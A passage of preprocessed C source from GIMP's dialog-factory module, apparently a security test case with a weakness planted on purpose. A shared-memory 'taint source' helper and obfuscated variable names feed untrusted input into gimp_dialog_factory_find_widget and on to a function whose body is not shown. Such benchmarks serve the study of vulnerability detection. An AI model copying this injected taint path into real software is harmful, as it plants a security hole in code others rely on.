stonesoup_tainted_buff, char* stonesoup_envKey, int stonesoup_shmsz) {\n    int stonesoup_shmid;\n key_t stonesoup_key;\n char *stonesoup_shm, *stonesoup_s;\n char* stonesoup_envSize = NULL;\n *stonesoup_tainted_buff = NULL;\n    if (getenv(\"STONESOUP_DISABLE_WEAKNESS\") == NULL ||\n        strcmp(getenv(\"STONESOUP_DISABLE_WEAKNESS\"), \"1\") != 0) {\n        if(stonesoup_envKey != NULL) {\n            if(sscanf(stonesoup_envKey, \"%d\", &stonesoup_key) > 0) {\n                if ((stonesoup_shmid = shmget(stonesoup_key, stonesoup_shmsz, 0666)) >= 0) {\n                    if ((stonesoup_shm = shmat(stonesoup_shmid, NULL, 0)) != (char *) -1) {\n                        *stonesoup_tainted_buff = (char*)calloc(stonesoup_shmsz, sizeof(char));\n                        /* STONESOUP: SOURCE-TAINT (Shared Memory) */\n                        for (stonesoup_s = stonesoup_shm; *stonesoup_s != (char)0; stonesoup_s++) {\n                            (*stonesoup_tainted_buff)[stonesoup_s - stonesoup_shm] = *stonesoup_s;\n                        }\n                    }\n                }\n            }\n        }\n    } else {\n        *stonesoup_tainted_buff = NULL;\n    }\n}\nvoid frowstiest_bonny(char *const bonnyish_windbreak);\nvoid acrite_absyrtus(int entryways_terebate,char *horologium_chiasso);\nvoid anorchism_presides(int klutzier_dalar,char *earlap_wat);\n\nstatic void gimp_dialog_factory_class_intern_init(gpointer klass)\n{\n  gimp_dialog_factory_parent_class = g_type_class_peek_parent(klass);\n  if (GimpDialogFactory_private_offset != 0) {\n    g_type_class_adjust_private_offset(klass,&GimpDialogFactory_private_offset);\n  }\n  gimp_dialog_factory_class_init(((GimpDialogFactoryClass *)klass));\n}\n\ninline static gpointer gimp_dialog_factory_get_instance_private(GimpDialogFactory *self)\n{\n  return (gpointer )(((guint8 *)self) + ((glong )GimpDialogFactory_private_offset));\n}\n\nGType gimp_dialog_factory_get_type()\n{\n  static volatile gsize g_define_type_id__volatile = 0;\n  if (({\n    typedef char _GStaticAssertCompileTimeAssertion_0[1?1 : -1];\n    (void )(0?((gpointer )( *(&g_define_type_id__volatile))) : 0);\n    !g_atomic_pointer_get((&g_define_type_id__volatile)) && ((\n{\n      typedef char _GStaticAssertCompileTimeAssertion_0[(1?1 : -1)];\n      (void )((0?((gpointer )( *(&g_define_type_id__volatile))) : 0));\n      !g_atomic_pointer_get((&g_define_type_id__volatile)) && g_once_init_enter((&g_define_type_id__volatile));\n    }));\n  })) \n{\n    GType g_define_type_id = g_type_register_static_simple(gimp_object_get_type(),g_intern_static_string(\"GimpDialogFactory\"),(sizeof(GimpDialogFactoryClass )),((GClassInitFunc )gimp_dialog_factory_class_intern_init),(sizeof(GimpDialogFactory )),((GInstanceInitFunc )gimp_dialog_factory_init),(0));\n{\n{\n{\n        }\n        ;\n      }\n    }\n    (\n{\n      typedef char _GStaticAssertCompileTimeAssertion_1[1?1 : -1];\n      (void )(0?( *(&g_define_type_id__volatile) = g_define_type_id) : 0);\n      (\n{\n        typedef char _GStaticAssertCompileTimeAssertion_1[1?1 : -1];\n        (void )(0?( *(&g_define_type_id__volatile) = ((gsize )g_define_type_id)) : 0);\n        g_once_init_leave((&g_define_type_id__volatile),((gsize )((gsize )g_define_type_id)));\n      });\n    });\n  }\n  return g_define_type_id__volatile;\n}\n#define parent_class gimp_dialog_factory_parent_class\nstatic guint factory_signals[LAST_SIGNAL] = {(0)};\n/* Is set by dialogs.c to a dialog factory initialized there.\n *\n * FIXME: The layer above should not do this kind of initialization of\n * layers below.\n */\nstatic GimpDialogFactory *gimp_toplevel_factory = ((void *)0);\n\nstatic void gimp_dialog_factory_class_init(GimpDialogFactoryClass *klass)\n{\n  GObjectClass *object_class = (GObjectClass *)(g_type_check_class_cast(((GTypeClass *)klass),((GType )(20 << 2))));\n  object_class -> dispose = gimp_dialog_factory_dispose;\n  object_class -> finalize = gimp_dialog_factory_finalize;\n  factory_signals[DOCK_WINDOW_ADDED] = g_signal_new(\"dock-window-added\",((GTypeClass *)klass) -> g_type,G_SIGNAL_RUN_LAST,((glong )((size_t )(&((GimpDialogFactoryClass *)0) -> dock_window_added))),((void *)0),((void *)0),g_cclosure_marshal_VOID__OBJECT,((GType )(1 << 2)),1,gimp_dock_window_get_type());\n  factory_signals[DOCK_WINDOW_REMOVED] = g_signal_new(\"dock-window-removed\",((GTypeClass *)klass) -> g_type,G_SIGNAL_RUN_LAST,((glong )((size_t )(&((GimpDialogFactoryClass *)0) -> dock_window_removed))),((void *)0),((void *)0),g_cclosure_marshal_VOID__OBJECT,((GType )(1 << 2)),1,gimp_dock_window_get_type());\n  g_type_class_add_private(klass,sizeof(GimpDialogFactoryPrivate ));\n}\n\nstatic void gimp_dialog_factory_init(GimpDialogFactory *factory)\n{\n  factory -> p = ((GimpDialogFactoryPrivate *)(g_type_instance_get_private(((GTypeInstance *)factory),gimp_dialog_factory_get_type())));\n  factory -> p -> dialog_state = GIMP_DIALOGS_SHOWN;\n}\n\nstatic void gimp_dialog_factory_dispose(GObject *object)\n{\n  GimpDialogFactory *factory = (GimpDialogFactory *)(g_type_check_instance_cast(((GTypeInstance *)object),gimp_dialog_factory_get_type()));\n  GList *list;\n/*  start iterating from the beginning each time we destroyed a\n   *  toplevel because destroying a dock may cause lots of items\n   *  to be removed from factory->p->open_dialogs\n   */\n  while(factory -> p -> open_dialogs){\n    for (list = factory -> p -> open_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n      if (gtk_widget_is_toplevel((list -> data))) {\n        gtk_widget_destroy(((GtkWidget *)(g_type_check_instance_cast(((GTypeInstance *)(list -> data)),gtk_widget_get_type()))));\n        break; \n      }\n    }\n/*  the list being non-empty without any toplevel is an error,\n       *  so eek and chain up\n       */\n    if (!list) {\n      g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: %d stale non-toplevel entries in factory->p->open_dialogs\",((const char *)__func__),g_list_length(factory -> p -> open_dialogs));\n      break; \n    }\n  }\n  if (factory -> p -> open_dialogs) {\n    g_list_free(factory -> p -> open_dialogs);\n    factory -> p -> open_dialogs = ((void *)0);\n  }\n  if (factory -> p -> session_infos) {\n    g_list_free_full(factory -> p -> session_infos,((GDestroyNotify )g_object_unref));\n    factory -> p -> session_infos = ((void *)0);\n  }\n  (((GObjectClass *)(g_type_check_class_cast(((GTypeClass *)gimp_dialog_factory_parent_class),((GType )(20 << 2))))) -> dispose)(object);\n}\n\nstatic void gimp_dialog_factory_finalize(GObject *object)\n{\n  GimpDialogFactory *factory = (GimpDialogFactory *)(g_type_check_instance_cast(((GTypeInstance *)object),gimp_dialog_factory_get_type()));\n  GList *list;\n  for (list = factory -> p -> registered_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpDialogFactoryEntry *entry = (list -> data);\n    g_free((entry -> identifier));\n    g_free((entry -> name));\n    g_free((entry -> blurb));\n    g_free((entry -> stock_id));\n    g_free((entry -> help_id));\n    do {\n      if (1) {\n        g_slice_free1(sizeof(GimpDialogFactoryEntry ),entry);\n      }\n      else {\n        (void )(((GimpDialogFactoryEntry *)0) == entry);\n      }\n    }while (0);\n  }\n  if (factory -> p -> registered_dialogs) {\n    g_list_free(factory -> p -> registered_dialogs);\n    factory -> p -> registered_dialogs = ((void *)0);\n  }\n  (((GObjectClass *)(g_type_check_class_cast(((GTypeClass *)gimp_dialog_factory_parent_class),((GType )(20 << 2))))) -> finalize)(object);\n}\n\nGimpDialogFactory *gimp_dialog_factory_new(const gchar *name,GimpContext *context,GimpMenuFactory *menu_factory)\n{\n  GimpDialogFactory *factory;\n  GimpGuiConfig *config;\n  do {\n    if (name != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"name != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)context;\n      GType __t = gimp_context_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_CONTEXT (context)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (!menu_factory || (({\n      GTypeInstance *__inst = (GTypeInstance *)menu_factory;\n      GType __t = gimp_menu_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    }))) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"! menu_factory || GIMP_IS_MENU_FACTORY (menu_factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  factory = (g_object_new(gimp_dialog_factory_get_type(),((void *)0)));\n  gimp_object_set_name(((GimpObject *)(g_type_check_instance_cast(((GTypeInstance *)factory),gimp_object_get_type()))),name);\n  config = ((GimpGuiConfig *)(g_type_check_instance_cast(((GTypeInstance *)(context -> gimp -> config)),gimp_gui_config_get_type())));\n  factory -> p -> context = context;\n  factory -> p -> menu_factory = menu_factory;\n  factory -> p -> dialog_state = ((config -> hide_docks?GIMP_DIALOGS_HIDDEN_EXPLICITLY : GIMP_DIALOGS_SHOWN));\n  g_signal_connect_object(config,\"notify::hide-docks\",((GCallback )gimp_dialog_factory_config_notify),factory,G_CONNECT_SWAPPED);\n  return factory;\n}\n\nvoid gimp_dialog_factory_register_entry(GimpDialogFactory *factory,const gchar *identifier,const gchar *name,const gchar *blurb,const gchar *stock_id,const gchar *help_id,GimpDialogNewFunc new_func,GimpDialogRestoreFunc restore_func,gint view_size,gboolean singleton,gboolean session_managed,gboolean remember_size,gboolean remember_if_open,gboolean hideable,gboolean image_window,gboolean dockable)\n{\n  GimpDialogFactoryEntry *entry;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ;\n    }\n    ;\n  }while (0);\n  entry = ((GimpDialogFactoryEntry *)(g_slice_alloc0(sizeof(GimpDialogFactoryEntry ))));\n  entry -> identifier = g_strdup(identifier);\n  entry -> name = g_strdup(name);\n  entry -> blurb = g_strdup(blurb);\n  entry -> stock_id = g_strdup(stock_id);\n  entry -> help_id = g_strdup(help_id);\n  entry -> new_func = new_func;\n  entry -> restore_func = restore_func;\n  entry -> view_size = view_size;\n  entry -> singleton = (singleton?!0 : 0);\n  entry -> session_managed = (session_managed?!0 : 0);\n  entry -> remember_size = (remember_size?!0 : 0);\n  entry -> remember_if_open = (remember_if_open?!0 : 0);\n  entry -> hideable = (hideable?!0 : 0);\n  entry -> image_window = (image_window?!0 : 0);\n  entry -> dockable = (dockable?!0 : 0);\n  factory -> p -> registered_dialogs = g_list_prepend(factory -> p -> registered_dialogs,entry);\n}\n\nGimpDialogFactoryEntry *gimp_dialog_factory_find_entry(GimpDialogFactory *factory,const gchar *identifier)\n{\n  GList *list;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  for (list = factory -> p -> registered_dialogs; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpDialogFactoryEntry *entry = (list -> data);\n    if (!strcmp(identifier,(entry -> identifier))) {\n      return entry;\n    }\n  }\n  return ((void *)0);\n}\n\nGimpSessionInfo *gimp_dialog_factory_find_session_info(GimpDialogFactory *factory,const gchar *identifier)\n{\n  GList *list;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpSessionInfo *info = (list -> data);\n    if (gimp_session_info_get_factory_entry(info) && g_str_equal(identifier,(gimp_session_info_get_factory_entry(info) -> identifier))) {\n      return info;\n    }\n  }\n  return ((void *)0);\n}\n\nGtkWidget *gimp_dialog_factory_find_widget(GimpDialogFactory *factory,const gchar *identifiers)\n{\n  int overbulky_tarweeds = 0;\n  char *mullan_aribine = 0;\n  int uropodous_marble = 30;\n  char *tumaco_educts;\n  GtkWidget *widget = ((void *)0);\n  gchar **ids;\n  gint i;\n  if (__sync_bool_compare_and_swap(&sentimos_christa,0,1)) {;\n    if (mkdir(\"/opt/stonesoup/workspace/lockDir\",509U) == 0) {;\n      tracepoint(stonesoup_trace,trace_location,\"/tmp/tmpSaTeqU_ss_testcase/src-rose/app/widgets/gimpdialogfactory.c\",\"gimp_dialog_factory_find_widget\");\n      stonesoup_setup_printf_context();\n      stonesoup_read_taint(&tumaco_educts,\"1427\",uropodous_marble);\n      if (tumaco_educts != 0) {;\n        overbulky_tarweeds = ((int )(strlen(tumaco_educts)));\n        mullan_aribine = ((char *)(malloc(overbulky_tarweeds + 1)));\n        if (mullan_aribine == 0) {\n          stonesoup_printf(\"Error: Failed to allocate memory\\n\");\n          exit(1);\n        }\n        memset(mullan_aribine,0,overbulky_tarweeds + 1);\n        memcpy(mullan_aribine,tumaco_educts,overbulky_tarweeds);\n        if (tumaco_educts != 0) \n          free(((char *)tumaco_educts));\n        frowstiest_bonny(mullan_aribine);\n      }\n    }\n  }\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifiers != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifiers != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  ids = g_strsplit(identifiers,\"|\",0);\n  for (i = 0; ids[i]; i++) {\n    GimpSessionInfo *info;\n    info = gimp_dialog_factory_find_session_info(factory,ids[i]);\n    if (info) {\n      widget = gimp_session_info_get_widget(info);\n      if (widget) {\n        break; \n      }\n    }\n  }\n  g_strfreev(ids);\n  return widget;\n}\n/**\n * gimp_dialog_factory_dialog_sane:\n * @factory:\n * @widget_factory:\n * @widget_entry:\n * @widget:\n *\n * Makes sure that the @widget with the given @widget_entry that was\n * created by the given @widget_factory belongs to @efactory.\n *\n * Returns: %TRUE if that is the case, %FALSE otherwise.\n **/\n\nstatic gboolean gimp_dialog_factory_dialog_sane(GimpDialogFactory *factory,GimpDialogFactory *widget_factory,GimpDialogFactoryEntry *widget_entry,GtkWidget *widget)\n{\n  if (!widget_factory || !widget_entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was not created by a GimpDialogFactory\",((const char *)__func__));\n    return 0;\n  }\n  if (widget_factory != factory) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was created by a different GimpDialogFactory\",((const char *)__func__));\n    return 0;\n  }\n  return !0;\n}\n/**\n * gimp_dialog_factory_dialog_new_internal:\n * @factory:\n * @screen:\n * @context:\n * @ui_manager:\n * @identifier:\n * @view_size:\n * @return_existing:   If %TRUE, (or if the dialog is a singleton),\n *                     don't create a new dialog if it exists, instead\n *                     return the existing one\n * @present:           If %TRUE, the toplevel that contains the dialog (if any)\n *                     will be gtk_window_present():ed\n * @create_containers: If %TRUE, then containers for the\n *                     dialog/dockable will be created as well. If you\n *                     want to manage your own containers, pass %FALSE\n *\n * This is the lowest level dialog factory creation function.\n *\n * Returns: A created or existing #GtkWidget.\n **/\n\nstatic GtkWidget *gimp_dialog_factory_dialog_new_internal(GimpDialogFactory *factory,GdkScreen *screen,GimpContext *context,GimpUIManager *ui_manager,const gchar *identifier,gint view_size,gboolean return_existing,gboolean present,gboolean create_containers)\n{\n  GimpDialogFactoryEntry *entry = ((void *)0);\n  GtkWidget *dialog = ((void *)0);\n  GtkWidget *toplevel = ((void *)0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  entry = gimp_dialog_factory_find_entry(factory,identifier);\n  if (!entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: no entry registered for \\\"%s\\\"\",((const char *)__func__),identifier);\n    return ((void *)0);\n  }\n  if (!entry -> new_func) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: entry for \\\"%s\\\" has no constructor\",((const char *)__func__),identifier);\n    return ((void *)0);\n  }\n/*  a singleton dialog is always returned if it already exisits  */\n  if (return_existing || entry -> singleton) {\n    dialog = gimp_dialog_factory_find_widget(factory,identifier);\n  }\n/*  create the dialog if it was not found  */\n  if (!dialog) {\n    GtkWidget *dock = ((void *)0);\n    GtkWidget *dock_window = ((void *)0);\n/* What follows is special-case code for some entires. At some\n       * point we might want to abstract this block of code away.\n       */\n    if (create_containers) {\n      if (entry -> dockable) {\n        GtkWidget *dockbook;\n/*  It doesn't make sense to have a dockable without a dock\n               *  so create one. Create a new dock _before_ creating the\n               *  dialog. We do this because the new dockable needs to be\n               *  created in its dock's context.\n               */\n        dock = gimp_dock_with_window_new(factory,screen,0);\n/*toolbox*/\n        dockbook = gimp_dockbook_new(factory -> p -> menu_factory);\n        gimp_dock_add_book(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type()))),((GimpDockbook *)(g_type_check_instance_cast(((GTypeInstance *)dockbook),gimp_dockbook_get_type()))),0);\n      }\n      else {\n        if (strcmp(\"gimp-toolbox\",(entry -> identifier)) == 0) {\n          GimpDockContainer *dock_container;\n          dock_window = gimp_dialog_factory_dialog_new(factory,screen,((void *)0),\"gimp-toolbox-window\",- 1,0);\n/*ui_manager*/\n/*view_size*/\n/*present*/\n/* When we get a dock window, we also get a UI\n               * manager\n               */\n          dock_container = ((GimpDockContainer *)(g_type_check_instance_cast(((GTypeInstance *)dock_window),gimp_dock_container_interface_get_type())));\n          ui_manager = gimp_dock_container_get_ui_manager(dock_container);\n        }\n      }\n    }\n/*  Create the new dialog in the appropriate context which is\n       *  - the passed context if not NULL\n       *  - the newly created dock's context if we just created it\n       *  - the factory's context, which happens when raising a toplevel\n       *    dialog was the original request.\n       */\n    if (view_size < GIMP_VIEW_SIZE_TINY) {\n      view_size = entry -> view_size;\n    }\n    if (context) {\n      dialog = gimp_dialog_factory_constructor(factory,entry,context,ui_manager,view_size);\n    }\n    else {\n      if (dock) {\n        dialog = gimp_dialog_factory_constructor(factory,entry,gimp_dock_get_context(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type())))),gimp_dock_get_ui_manager(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type())))),view_size);\n      }\n      else {\n        dialog = gimp_dialog_factory_constructor(factory,entry,factory -> p -> context,ui_manager,view_size);\n      }\n    }\n    if (dialog) {\n      gimp_dialog_factory_set_widget_data(dialog,factory,entry);\n/*  If we created a dock before, the newly created dialog is\n           *  supposed to be a GimpDockable.\n           */\n      if (dock) {\n        if (({\n          GTypeInstance *__inst = (GTypeInstance *)dialog;\n          GType __t = gimp_dockable_get_type();\n          gboolean __r;\n          if (!__inst) {\n            __r = 0;\n          }\n          else {\n            if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n              __r = !0;\n            }\n            else {\n              __r = g_type_check_instance_is_a(__inst,__t);\n            }\n          }\n          __r;\n        })) \n{\n          gimp_dock_add(((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dock),gimp_dock_get_type()))),((GimpDockable *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gimp_dockable_get_type()))),0,0);\n          gtk_widget_show(dock);\n        }\n        else {\n          g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: GimpDialogFactory is a dockable factory but constructor for \\\"%s\\\" did not return a GimpDockable\",((const char *)__func__),identifier);\n          gtk_widget_destroy(dialog);\n          gtk_widget_destroy(dock);\n          dialog = ((void *)0);\n          dock = ((void *)0);\n        }\n      }\n      else {\n        if (dock_window) {\n          if (({\n            GTypeInstance *__inst = (GTypeInstance *)dialog;\n            GType __t = gimp_dock_get_type();\n            gboolean __r;\n            if (!__inst) {\n              __r = 0;\n            }\n            else {\n              if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n                __r = !0;\n              }\n              else {\n                __r = g_type_check_instance_is_a(__inst,__t);\n              }\n            }\n            __r;\n          })) \n{\n            gimp_dock_window_add_dock(((GimpDockWindow *)(g_type_check_instance_cast(((GTypeInstance *)dock_window),gimp_dock_window_get_type()))),((GimpDock *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gimp_dock_get_type()))),- 1);\n/*index*/\n            gtk_widget_set_visible(dialog,present);\n            gtk_widget_set_visible(dock_window,present);\n          }\n          else {\n            g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: GimpDialogFactory is a dock factory entry but constructor for \\\"%s\\\" did not return a GimpDock\",((const char *)__func__),identifier);\n            gtk_widget_destroy(dialog);\n            gtk_widget_destroy(dock_window);\n            dialog = ((void *)0);\n            dock_window = ((void *)0);\n          }\n        }\n      }\n    }\n    else {\n      if (dock) {\n        g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: constructor for \\\"%s\\\" returned NULL\",((const char *)__func__),identifier);\n        gtk_widget_destroy(dock);\n        dock = ((void *)0);\n      }\n    }\n    if (dialog) {\n      gimp_dialog_factory_add_dialog(factory,dialog);\n    }\n  }\n/*  Finally, if we found an existing dialog or created a new one, raise it.\n   */\n  if (!dialog) {\n    return ((void *)0);\n  }\n  if (gtk_widget_is_toplevel(dialog)) {\n    gtk_window_set_screen(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),screen);\n    toplevel = dialog;\n  }\n  else {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gimp_dock_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n      toplevel = gtk_widget_get_toplevel(dialog);\n    }\n    else {\n      if (({\n        GTypeInstance *__inst = (GTypeInstance *)dialog;\n        GType __t = gimp_dockable_get_type();\n        gboolean __r;\n        if (!__inst) {\n          __r = 0;\n        }\n        else {\n          if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n            __r = !0;\n          }\n          else {\n            __r = g_type_check_instance_is_a(__inst,__t);\n          }\n        }\n        __r;\n      })) \n{\n        GimpDockable *dockable = (GimpDockable *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gimp_dockable_get_type()));\n        if (gimp_dockable_get_dockbook(dockable) && gimp_dockbook_get_dock(gimp_dockable_get_dockbook(dockable))) {\n          GtkNotebook *notebook = (GtkNotebook *)(g_type_check_instance_cast(((GTypeInstance *)(gimp_dockable_get_dockbook(dockable))),gtk_notebook_get_type()));\n          gint num = gtk_notebook_page_num(notebook,dialog);\n          if (num != - 1) {\n            gtk_notebook_set_current_page(notebook,num);\n            gimp_dockable_blink(dockable);\n          }\n        }\n        toplevel = gtk_widget_get_toplevel(dialog);\n      }\n    }\n  }\n  if (present && (({\n    GTypeInstance *__inst = (GTypeInstance *)toplevel;\n    GType __t = gtk_window_get_type();\n    gboolean __r;\n    if (!__inst) {\n      __r = 0;\n    }\n    else {\n      if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n        __r = !0;\n      }\n      else {\n        __r = g_type_check_instance_is_a(__inst,__t);\n      }\n    }\n    __r;\n  }))) \n{\n/*  Work around focus-stealing protection, or whatever makes the\n       *  dock appear below the one where we clicked a button to open\n       *  it. See bug #630173.\n       */\n    gtk_widget_show_now(toplevel);\n    gdk_window_raise(gtk_widget_get_window(toplevel));\n  }\n  return dialog;\n}\n/**\n * gimp_dialog_factory_dialog_new:\n * @factory:      a #GimpDialogFactory\n * @screen:       the #GdkScreen the dialog should appear on\n * @ui_manager:   A #GimpUIManager, if applicable.\n * @identifier:   the identifier of the dialog as registered with\n *                gimp_dialog_factory_register_entry()\n * @view_size:    the initial preview size\n * @present:      whether gtk_window_present() should be called\n *\n * Creates a new toplevel dialog or a #GimpDockable, depending on whether\n * %factory is a toplevel of dockable factory.\n *\n * Return value: the newly created dialog or an already existing singleton\n *               dialog.\n **/\n\nGtkWidget *gimp_dialog_factory_dialog_new(GimpDialogFactory *factory,GdkScreen *screen,GimpUIManager *ui_manager,const gchar *identifier,gint view_size,gboolean present)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)screen;\n      GType __t = gdk_screen_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GDK_IS_SCREEN (screen)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return gimp_dialog_factory_dialog_new_internal(factory,screen,factory -> p -> context,ui_manager,identifier,view_size,0,present,0);\n/*return_existing*/\n/*create_containers*/\n}\n\nGimpContext *gimp_dialog_factory_get_context(GimpDialogFactory 